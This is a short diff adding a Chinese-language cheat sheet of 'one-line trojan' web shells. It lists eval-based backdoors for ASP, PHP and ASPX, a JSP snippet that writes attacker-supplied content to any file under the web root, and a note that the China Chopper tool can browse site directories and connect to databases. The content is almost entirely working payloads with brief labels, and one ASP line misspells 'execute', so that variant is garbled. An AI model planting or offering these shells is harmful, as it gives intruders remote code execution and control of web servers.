@@ -1,0 +1,15 @@
+一句话： <%excute request("value")%> 执行传过来的代码
+<%eval request("value")%>
+asp:
+   <%eval request("c")%>
+  <?php @eval($_POST[value]);?>
+aspx一句话木马：
+  <%@ Page Language="Jscript"%>
+  <%eval(Request.Item["value"])%>
+jsp
+<% if(request.getParameter("f")!=null)
+	(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).
+	write(request.getParameter("t").getBytes());%>
+
+中国菜刀：
+	可进行网站目录获取 数据库连接等操作
